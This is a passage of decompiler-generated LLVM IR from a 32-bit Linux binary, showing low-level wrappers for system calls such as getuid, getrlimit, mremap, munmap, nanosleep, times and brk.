  uselistorder i32 15, { 4, 3, 9, 1, 0, 2, 5, 6, 7, 8 }
  uselistorder i32 -16, { 14, 46, 136, 137, 19, 20, 66, 67, 68, 69, 47, 48, 51, 15, 56, 57, 62, 63, 64, 65, 58, 59, 54, 18, 52, 17, 49, 50, 60, 61, 21, 70, 71, 72, 73, 55, 53, 16, 22, 23, 74, 75, 24, 25, 77, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 133, 94, 93, 45, 92, 2, 104, 3, 27, 38, 120, 28, 105, 33, 31, 107, 32, 1, 26, 103, 29, 106, 30, 4, 12, 43, 44, 122, 11, 123, 124, 39, 40, 121, 41, 125, 42, 108, 5, 109, 34, 110, 35, 111, 6, 112, 7, 113, 114, 8, 115, 116, 9, 117, 118, 36, 119, 10, 37, 126, 127, 95, 96, 97, 98, 99, 100, 101, 102, 128, 129, 130, 131, 138, 0, 132, 13, 134, 135 }
  uselistorder i32 30, { 6, 4, 2, 1, 5, 3, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805466d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054668, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80545ca, { 1, 0 }
}

define i32 @function_8054675() local_unnamed_addr {
dec_label_pc_8054675:
  %stack_var_-8 = alloca i32, align 4
  %v2_8054678 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805467f = call i32 @function_805471f(i32 7, i32 %v2_8054678)
  store i32 256, i32* @edx, align 4
  %v2_805468c = icmp slt i32 %v2_805467f, 0
  br i1 %v2_805468c, label %dec_label_pc_8054694, label %dec_label_pc_8054690

dec_label_pc_8054690:                             ; preds = %dec_label_pc_8054675
  %v3_8054690 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8054690, i32* @edx, align 4
  br label %dec_label_pc_8054694

dec_label_pc_8054694:                             ; preds = %dec_label_pc_8054675, %dec_label_pc_8054690
  %v0_8054694 = phi i32 [ 256, %dec_label_pc_8054675 ], [ %v3_8054690, %dec_label_pc_8054690 ]
  ret i32 %v0_8054694

; uselistorder directives
  uselistorder i32 7, { 7, 17, 0, 1, 3, 8, 4, 9, 5, 10, 6, 11, 19, 20, 18, 21, 22, 23, 14, 12, 15, 16, 24, 25, 13, 26, 27, 2 }
  uselistorder label %dec_label_pc_8054694, { 1, 0 }
}

define i32 @function_805469a() local_unnamed_addr {
dec_label_pc_805469a:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805469a = load i32, i32* @ebx, align 4
  store i32 %v0_805469a, i32* %stack_var_-4, align 4
  %v1_80546a3 = call i32 @int80_syscall(i32 202)
  store i32 %v1_80546a3, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80546a3, -4095
  br i1 %tmp7, label %dec_label_pc_80546ba, label %dec_label_pc_80546ae

dec_label_pc_80546ae:                             ; preds = %dec_label_pc_805469a
  %v1_80546ae = call i32 @function_8052729(i32 %v0_805469a)
  %v0_80546b3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546b3 = sub i32 0, %v0_80546b3
  %v2_80546b5 = inttoptr i32 %v1_80546ae to i32*
  store i32 %v1_80546b3, i32* %v2_80546b5, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80546be.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80546ba

dec_label_pc_80546ba:                             ; preds = %dec_label_pc_805469a, %dec_label_pc_80546ae
  %v2_80546be = phi i32 [ %v0_805469a, %dec_label_pc_805469a ], [ %v2_80546be.pre, %dec_label_pc_80546ae ]
  %v0_80546ba = phi i32 [ %v1_80546a3, %dec_label_pc_805469a ], [ -1, %dec_label_pc_80546ae ]
  store i32 %v2_80546be, i32* @ebx, align 4
  ret i32 %v0_80546ba

; uselistorder directives
  uselistorder i32 %v1_80546a3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546ba, { 1, 0 }
}

define i32 @function_80546c0() local_unnamed_addr {
dec_label_pc_80546c0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80546c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80546c0, i32* %stack_var_-4, align 4
  %v1_80546c9 = call i32 @int80_syscall(i32 201)
  store i32 %v1_80546c9, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80546c9, -4095
  br i1 %tmp7, label %dec_label_pc_80546e0, label %dec_label_pc_80546d4

dec_label_pc_80546d4:                             ; preds = %dec_label_pc_80546c0
  %v1_80546d4 = call i32 @function_8052729(i32 %v0_80546c0)
  %v0_80546d9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546d9 = sub i32 0, %v0_80546d9
  %v2_80546db = inttoptr i32 %v1_80546d4 to i32*
  store i32 %v1_80546d9, i32* %v2_80546db, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80546e4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80546e0

dec_label_pc_80546e0:                             ; preds = %dec_label_pc_80546c0, %dec_label_pc_80546d4
  %v2_80546e4 = phi i32 [ %v0_80546c0, %dec_label_pc_80546c0 ], [ %v2_80546e4.pre, %dec_label_pc_80546d4 ]
  %v0_80546e0 = phi i32 [ %v1_80546c9, %dec_label_pc_80546c0 ], [ -1, %dec_label_pc_80546d4 ]
  store i32 %v2_80546e4, i32* @ebx, align 4
  ret i32 %v0_80546e0

; uselistorder directives
  uselistorder i32 %v1_80546c9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546e0, { 1, 0 }
}

define i32 @function_80546e6() local_unnamed_addr {
dec_label_pc_80546e6:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80546e6 = load i32, i32* @ebx, align 4
  store i32 %v0_80546e6, i32* %stack_var_-4, align 4
  %v1_80546ef = call i32 @int80_syscall(i32 200)
  store i32 %v1_80546ef, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80546ef, -4095
  br i1 %tmp7, label %dec_label_pc_8054706, label %dec_label_pc_80546fa

dec_label_pc_80546fa:                             ; preds = %dec_label_pc_80546e6
  %v1_80546fa = call i32 @function_8052729(i32 %v0_80546e6)
  %v0_80546ff = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546ff = sub i32 0, %v0_80546ff
  %v2_8054701 = inttoptr i32 %v1_80546fa to i32*
  store i32 %v1_80546ff, i32* %v2_8054701, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805470a.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054706

dec_label_pc_8054706:                             ; preds = %dec_label_pc_80546e6, %dec_label_pc_80546fa
  %v2_805470a = phi i32 [ %v0_80546e6, %dec_label_pc_80546e6 ], [ %v2_805470a.pre, %dec_label_pc_80546fa ]
  %v0_8054706 = phi i32 [ %v1_80546ef, %dec_label_pc_80546e6 ], [ -1, %dec_label_pc_80546fa ]
  store i32 %v2_805470a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054706

; uselistorder directives
  uselistorder i32 %v1_80546ef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054706, { 1, 0 }
}

define i32 @function_805470c() local_unnamed_addr {
dec_label_pc_805470c:
  %v0_805470c = load i32, i32* @global_var_8056944.239, align 4
  %v1_8054716 = icmp eq i32 %v0_805470c, 0
  br i1 %v1_8054716, label %dec_label_pc_805471c, label %dec_label_pc_805471a

dec_label_pc_805471a:                             ; preds = %dec_label_pc_805470c
  br label %dec_label_pc_805471c

dec_label_pc_805471c:                             ; preds = %dec_label_pc_805470c, %dec_label_pc_805471a
  %storemerge = phi i32 [ %v0_805470c, %dec_label_pc_805471a ], [ 4096, %dec_label_pc_805470c ]
  %v0_805471c = phi i32 [ %v0_805470c, %dec_label_pc_805471a ], [ 4096, %dec_label_pc_805470c ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_805471c

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 11, 12, 2, 7, 5, 6, 8, 9, 10, 3, 4 }
  uselistorder label %dec_label_pc_805471c, { 1, 0 }
}

define i32 @function_805471f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805471f:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805471f = load i32, i32* @ebx, align 4
  store i32 %v0_805471f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054732 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8054732, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8054732, -4095
  br i1 %tmp9, label %dec_label_pc_805474b, label %dec_label_pc_805473f

dec_label_pc_805473f:                             ; preds = %dec_label_pc_805471f
  %v1_805473f = call i32 @function_8052729(i32 %v0_805471f)
  %v0_8054744 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054744 = sub i32 0, %v0_8054744
  %v2_8054746 = inttoptr i32 %v1_805473f to i32*
  store i32 %v1_8054744, i32* %v2_8054746, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805474f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805474b

dec_label_pc_805474b:                             ; preds = %dec_label_pc_805471f, %dec_label_pc_805473f
  %v2_805474f = phi i32 [ %v0_805471f, %dec_label_pc_805471f ], [ %v2_805474f.pre, %dec_label_pc_805473f ]
  %v0_805474b = phi i32 [ %v1_8054732, %dec_label_pc_805471f ], [ -1, %dec_label_pc_805473f ]
  store i32 %v2_805474f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805474b

; uselistorder directives
  uselistorder i32 %v1_8054732, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805474b, { 1, 0 }
}

define i32 @function_8054751() local_unnamed_addr {
dec_label_pc_8054751:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054751 = load i32, i32* @ebx, align 4
  store i32 %v0_8054751, i32* %stack_var_-4, align 4
  %v1_805475a = call i32 @int80_syscall(i32 199)
  store i32 %v1_805475a, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805475a, -4095
  br i1 %tmp7, label %dec_label_pc_8054771, label %dec_label_pc_8054765

dec_label_pc_8054765:                             ; preds = %dec_label_pc_8054751
  %v1_8054765 = call i32 @function_8052729(i32 %v0_8054751)
  %v0_805476a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805476a = sub i32 0, %v0_805476a
  %v2_805476c = inttoptr i32 %v1_8054765 to i32*
  store i32 %v1_805476a, i32* %v2_805476c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054775.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054771

dec_label_pc_8054771:                             ; preds = %dec_label_pc_8054751, %dec_label_pc_8054765
  %v2_8054775 = phi i32 [ %v0_8054751, %dec_label_pc_8054751 ], [ %v2_8054775.pre, %dec_label_pc_8054765 ]
  %v0_8054771 = phi i32 [ %v1_805475a, %dec_label_pc_8054751 ], [ -1, %dec_label_pc_8054765 ]
  store i32 %v2_8054775, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054771

; uselistorder directives
  uselistorder i32 %v1_805475a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054771, { 1, 0 }
}

define i32 @function_8054777(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054777:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_805478d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805478d, i32* %esi.global-to-local, align 4
  %v1_80547a4 = call i32 @int80_syscall(i32 140)
  store i32 %v1_80547a4, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_80547a4, -4095
  br i1 %tmp18, label %dec_label_pc_80547be, label %dec_label_pc_80547b0

dec_label_pc_80547b0:                             ; preds = %dec_label_pc_8054777
  %v2_8054791 = ashr i32 %tmp8, 31
  %v1_80547b0 = call i32 @function_8052729(i32 %v2_8054791)
  %v0_80547b5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80547b5 = sub i32 0, %v0_80547b5
  %v2_80547b7 = inttoptr i32 %v1_80547b0 to i32*
  store i32 %v1_80547b5, i32* %v2_80547b7, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80547c2

dec_label_pc_80547be:                             ; preds = %dec_label_pc_8054777
  %v1_80547be = icmp eq i32 %v1_80547a4, 0
  br i1 %v1_80547be, label %dec_label_pc_80547c7, label %dec_label_pc_80547c2

dec_label_pc_80547c2:                             ; preds = %dec_label_pc_80547be, %dec_label_pc_80547b0
  %v0_80547c2 = phi i32 [ %v1_80547a4, %dec_label_pc_80547be ], [ -1, %dec_label_pc_80547b0 ]
  %v1_80547c4 = ashr i32 %v0_80547c2, 31
  br label %dec_label_pc_80547cf

dec_label_pc_80547c7:                             ; preds = %dec_label_pc_80547be
  %v3_80547c7 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80547cf

dec_label_pc_80547cf:                             ; preds = %dec_label_pc_80547c2, %dec_label_pc_80547c7
  %v0_80547d5 = phi i32 [ %v0_80547c2, %dec_label_pc_80547c2 ], [ %v3_80547c7, %dec_label_pc_80547c7 ]
  %storemerge = phi i32 [ %v1_80547c4, %dec_label_pc_80547c2 ], [ %tmp, %dec_label_pc_80547c7 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_80547d5

; uselistorder directives
  uselistorder i32 %v1_80547a4, { 1, 2, 0, 3 }
  uselistorder i32 31, { 9, 10, 6, 1, 2, 3, 4, 7, 5, 8, 0, 11 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80547cf, { 1, 0 }
}

define i32 @function_80547d6(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_80547d6:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80547d7 = load i32, i32* @esi, align 4
  store i32 %v0_80547d7, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80547ef = load i32, i32* @ebx, align 4
  %v5_80547f7 = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_80547f7 = ptrtoint i32* %v5_80547f7 to i32
  store i32 %v0_80547ef, i32* @ebx, align 4
  store i32 %v6_80547f7, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_80547f7, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_8054803, label %dec_label_pc_805480f

dec_label_pc_8054803:                             ; preds = %dec_label_pc_80547d6
  %v1_8054803 = call i32 @function_8052729(i32 %v0_80547ef)
  %v0_8054808 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054808 = sub i32 0, %v0_8054808
  %v2_805480a = inttoptr i32 %v1_8054803 to i32*
  store i32 %v1_8054808, i32* %v2_805480a, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8054812.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805480f

dec_label_pc_805480f:                             ; preds = %dec_label_pc_80547d6, %dec_label_pc_8054803
  %v2_8054812 = phi i32 [ %v0_80547d7, %dec_label_pc_80547d6 ], [ %v2_8054812.pre, %dec_label_pc_8054803 ]
  %v0_805480f = phi i32 [ %v6_80547f7, %dec_label_pc_80547d6 ], [ -1, %dec_label_pc_8054803 ]
  %v2_8054811 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054811, i32* @edx, align 4
  store i32 %v2_8054812, i32* @esi, align 4
  ret i32 %v0_805480f

; uselistorder directives
  uselistorder i32 %v0_80547ef, { 1, 0 }
  uselistorder label %dec_label_pc_805480f, { 1, 0 }
}

define i32 @function_8054815(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054815:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054815 = load i32, i32* @ebx, align 4
  store i32 %v0_8054815, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8054828 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8054828, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8054828, -4095
  br i1 %tmp10, label %dec_label_pc_8054841, label %dec_label_pc_8054835

dec_label_pc_8054835:                             ; preds = %dec_label_pc_8054815
  %v1_8054835 = call i32 @function_8052729(i32 %v0_8054815)
  %v0_805483a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805483a = sub i32 0, %v0_805483a
  %v2_805483c = inttoptr i32 %v1_8054835 to i32*
  store i32 %v1_805483a, i32* %v2_805483c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054845.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054841

dec_label_pc_8054841:                             ; preds = %dec_label_pc_8054815, %dec_label_pc_8054835
  %v2_8054845 = phi i32 [ %v0_8054815, %dec_label_pc_8054815 ], [ %v2_8054845.pre, %dec_label_pc_8054835 ]
  %v0_8054841 = phi i32 [ %v3_8054828, %dec_label_pc_8054815 ], [ -1, %dec_label_pc_8054835 ]
  %v2_8054843 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054843, i32* @edx, align 4
  store i32 %v2_8054845, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054841

; uselistorder directives
  uselistorder i32 %v3_8054828, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054841, { 1, 0 }
}

define i32 @function_8054847(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054847:
  %ebx.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054847 = load i32, i32* @ebx, align 4
  store i32 %v0_8054847, i32* %stack_var_-4, align 4
  %v4_805484b = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_805484b, i32* %ebx.global-to-local, align 4
  %v6_805485a = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp5)
  store i32 %v6_805485a, i32* %ebx.global-to-local, align 4
  %tmp12 = icmp ult i32 %v6_805485a, -4095
  br i1 %tmp12, label %dec_label_pc_8054873, label %dec_label_pc_8054867

dec_label_pc_8054867:                             ; preds = %dec_label_pc_8054847
  %v1_8054867 = call i32 @function_8052729(i32 %v0_8054847)
  %v0_805486c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805486c = sub i32 0, %v0_805486c
  %v2_805486e = inttoptr i32 %v1_8054867 to i32*
  store i32 %v1_805486c, i32* %v2_805486e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054877.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054873

dec_label_pc_8054873:                             ; preds = %dec_label_pc_8054847, %dec_label_pc_8054867
  %v2_8054877 = phi i32 [ %v0_8054847, %dec_label_pc_8054847 ], [ %v2_8054877.pre, %dec_label_pc_8054867 ]
  %v0_8054873 = phi i32 [ %v6_805485a, %dec_label_pc_8054847 ], [ -1, %dec_label_pc_8054867 ]
  %v2_8054875 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054875, i32* @edx, align 4
  store i32 %v2_8054877, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054873

; uselistorder directives
  uselistorder i32 %v6_805485a, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054873, { 1, 0 }
}

define i32 @function_8054879(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054879:
  %stack_var_-12 = alloca i32, align 4
  %v0_805487a = load i32, i32* @ebx, align 4
  %v0_805487e = load i32, i32* @global_var_8056958.246, align 8
  %v1_805487e = icmp eq i32 %v0_805487e, 0
  %v1_8054889 = icmp eq i1 %v1_805487e, false
  br i1 %v1_8054889, label %dec_label_pc_805489c, label %dec_label_pc_805488b

dec_label_pc_805488b:                             ; preds = %dec_label_pc_8054879
  %v1_8054890 = call i32 @function_8054a3f(i32 0)
  %v2_8054898 = icmp slt i32 %v1_8054890, 0
  br i1 %v2_8054898, label %dec_label_pc_80548be, label %dec_label_pc_805488b.dec_label_pc_805489c_crit_edge

dec_label_pc_805488b.dec_label_pc_805489c_crit_edge: ; preds = %dec_label_pc_805488b
  %v0_805489e.pre = load i32, i32* @global_var_8056958.246, align 8
  br label %dec_label_pc_805489c

dec_label_pc_805489c:                             ; preds = %dec_label_pc_805488b.dec_label_pc_805489c_crit_edge, %dec_label_pc_8054879
  %v0_80548ac = phi i32 [ %v0_805489e.pre, %dec_label_pc_805488b.dec_label_pc_805489c_crit_edge ], [ %v0_805487e, %dec_label_pc_8054879 ]
  %v1_805489c = icmp eq i32 %arg1, 0
  %v1_80548a3 = icmp eq i1 %v1_805489c, false
  br i1 %v1_80548a3, label %dec_label_pc_80548a9, label %dec_label_pc_80548a5

dec_label_pc_80548a5:                             ; preds = %dec_label_pc_805489c
  br label %dec_label_pc_80548c1

dec_label_pc_80548a9:                             ; preds = %dec_label_pc_805489c
  store i32 %v0_80548ac, i32* @ebx, align 4
  %v2_80548ae = add i32 %v0_80548ac, %arg1
  %v1_80548b2 = call i32 @function_8054a3f(i32 %v2_80548ae)
  %v2_80548ba = icmp slt i32 %v1_80548b2, 0
  %v1_80548bc = icmp eq i1 %v2_80548ba, false
  br i1 %v1_80548bc, label %dec_label_pc_80548a9.dec_label_pc_80548c1_crit_edge, label %dec_label_pc_80548be

dec_label_pc_80548a9.dec_label_pc_80548c1_crit_edge: ; preds = %dec_label_pc_80548a9
  %v0_80548c1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80548c1

dec_label_pc_80548be:                             ; preds = %dec_label_pc_80548a9, %dec_label_pc_805488b
  br label %dec_label_pc_80548c1

dec_label_pc_80548c1:                             ; preds = %dec_label_pc_80548a9.dec_label_pc_80548c1_crit_edge, %dec_label_pc_80548a5, %dec_label_pc_80548be
  %v0_80548c1 = phi i32 [ %v0_80548c1.pre, %dec_label_pc_80548a9.dec_label_pc_80548c1_crit_edge ], [ %v0_80548ac, %dec_label_pc_80548a5 ], [ -1, %dec_label_pc_80548be ]
  %v2_80548c3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80548c3, i32* @edx, align 4
  store i32 %v0_805487a, i32* @ebx, align 4
  ret i32 %v0_80548c1

; uselistorder directives
  uselistorder i32 %v0_80548ac, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8054a3f, { 1, 0 }
  uselistorder label %dec_label_pc_80548c1, { 2, 0, 1 }
}

define i32 @function_80548c7(%tms* %arg1) local_unnamed_addr {
dec_label_pc_80548c7:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80548c7 = load i32, i32* @edi, align 4
  store i32 %v0_80548c7, i32* %stack_var_-4, align 4
  %v4_80548cb = ptrtoint %tms* %arg1 to i32
  store i32 %v4_80548cb, i32* %edi.global-to-local, align 4
  %v0_80548cf = load i32, i32* @ebx, align 4
  %v3_80548d7 = call i32 @times(%tms* %arg1)
  store i32 %v3_80548d7, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_80548d7, -4095
  br i1 %tmp9, label %dec_label_pc_80548ef, label %dec_label_pc_80548e3

dec_label_pc_80548e3:                             ; preds = %dec_label_pc_80548c7
  %v1_80548e3 = call i32 @function_8052729(i32 %v0_80548cf)
  %v0_80548e8 = load i32, i32* %edi.global-to-local, align 4
  %v1_80548e8 = sub i32 0, %v0_80548e8
  %v2_80548ea = inttoptr i32 %v1_80548e3 to i32*
  store i32 %v1_80548e8, i32* %v2_80548ea, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80548f3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80548ef

dec_label_pc_80548ef:                             ; preds = %dec_label_pc_80548c7, %dec_label_pc_80548e3
  %v2_80548f3 = phi i32 [ %v0_80548c7, %dec_label_pc_80548c7 ], [ %v2_80548f3.pre, %dec_label_pc_80548e3 ]
  %v0_80548ef = phi i32 [ %v3_80548d7, %dec_label_pc_80548c7 ], [ -1, %dec_label_pc_80548e3 ]
  store i32 %v2_80548f3, i32* %edi.global-to-local, align 4
  ret i32 %v0_80548ef

; uselistorder directives
  uselistorder i32 %v3_80548d7, { 1, 0, 2 }
  uselistorder i32* @edi, { 8, 112, 113, 114, 115, 116, 171, 7, 172, 173, 174, 175, 1, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 91, 92, 93, 94, 95, 96, 97, 98, 99, 194, 208, 209, 195, 196, 197, 198, 199, 200, 201, 202, 2, 203, 204, 205, 206, 207, 210, 211, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 9, 130, 131, 212, 213, 132, 133, 134, 135, 10, 214, 215, 11, 216, 217, 218, 219, 136, 3, 137, 138, 18, 19, 20, 21, 56, 57, 58, 59, 60, 61, 62, 63, 49, 50, 51, 22, 23, 24, 25, 26, 64, 65, 66, 37, 38, 39, 12, 13, 14, 34, 35, 36, 40, 41, 42, 43, 44, 45, 46, 47, 68, 69, 70, 55, 71, 72, 73, 52, 15, 16, 17, 67, 27, 28, 29, 30, 31, 32, 33, 48, 53, 54, 74, 75, 76, 77, 78, 79, 0, 6, 90, 80, 81, 82, 83, 84, 85, 86, 87, 89, 88, 4, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 170, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 5, 168, 169, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 242, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80548ef, { 1, 0 }
}

define i32 @function_80548f5(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80548f5:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80548f6 = load i32, i32* @ebx, align 4
  store i32 %v0_80548f6, i32* %stack_var_-8, align 4
  %v4_80548fa = ptrtoint i16* %arg1 to i32
  store i32 %v4_80548fa, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_8054907 = inttoptr i32 %arg2 to i8*
  %v4_8054907 = call i32 @function_805277a(i8* %v3_8054907, i32 0, i32 88)
  store i32 %v4_8054907, i32* %eax.global-to-local, align 4
  %v2_805490c = load i16, i16* %arg1, align 2
  %v3_805490c = zext i16 %v2_805490c to i32
  store i32 %v3_805490c, i32* %eax.global-to-local, align 4
  %v0_805490f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805490f = add i32 %v0_805490f, 4
  %v2_805490f = inttoptr i32 %v1_805490f to i32*
  store i32 0, i32* %v2_805490f, align 4
  %v0_8054916 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054916 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054916 = inttoptr i32 %v1_8054916 to i32*
  store i32 %v0_8054916, i32* %v2_8054916, align 4
  %v0_8054918 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054918 = add i32 %v0_8054918, 4
  %v2_8054918 = inttoptr i32 %v1_8054918 to i32*
  %v3_8054918 = load i32, i32* %v2_8054918, align 4
  store i32 %v3_8054918, i32* %eax.global-to-local, align 4
  %v1_805491b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805491b = add i32 %v1_805491b, 12
  %v3_805491b = inttoptr i32 %v2_805491b to i32*
  store i32 %v3_8054918, i32* %v3_805491b, align 4
  %v0_805491e = load i32, i32* %esi.global-to-local, align 4
  %v1_805491e = add i32 %v0_805491e, 8
  %v2_805491e = inttoptr i32 %v1_805491e to i16*
  %v3_805491e = load i16, i16* %v2_805491e, align 2
  %v4_805491e = zext i16 %v3_805491e to i32
  store i32 %v4_805491e, i32* %eax.global-to-local, align 4
  %v1_8054922 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054922 = add i32 %v1_8054922, 16
  %v3_8054922 = inttoptr i32 %v2_8054922 to i32*
  store i32 %v4_805491e, i32* %v3_8054922, align 4
  %v0_8054925 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054925 = add i32 %v0_8054925, 10
  %v2_8054925 = inttoptr i32 %v1_8054925 to i16*
  %v3_8054925 = load i16, i16* %v2_8054925, align 2
  %v4_8054925 = zext i16 %v3_8054925 to i32
  store i32 %v4_8054925, i32* %eax.global-to-local, align 4
  %v1_8054929 = load i32, i32* %ebx.global-to-local, align 4
